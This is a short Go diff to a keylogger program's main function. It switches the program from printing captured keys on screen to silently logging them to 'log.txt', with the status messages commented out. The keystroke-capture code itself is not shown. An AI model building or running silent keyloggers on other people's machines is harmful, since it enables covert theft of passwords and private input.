@@ -1,23 +1,19 @@
 package main
 
-import (
-	"fmt"
-)
+// "fmt"
 
 func main() {
 
 	k := createKeylogger()
-	fmt.Println("Start logging:")
-	k.startLogging(20)
-	fmt.Println("DONE")
-	//fmt.Println(k.log)
+	k.setMode(0, "log.txt")
 
-	// prints out key presses in order
-	for _, key := range k.log {
-		if key.down {
-			fmt.Print(" ", key.name, " ")
-		}
-	}
+	// fmt.Println("Start logging")
+	k.start(13)
+	// fmt.Println("DONE")
+
+	// for _, key := range k.getDownEvents() {
+	// 	fmt.Print(key.name, " ")
+	// }
 
 }
 
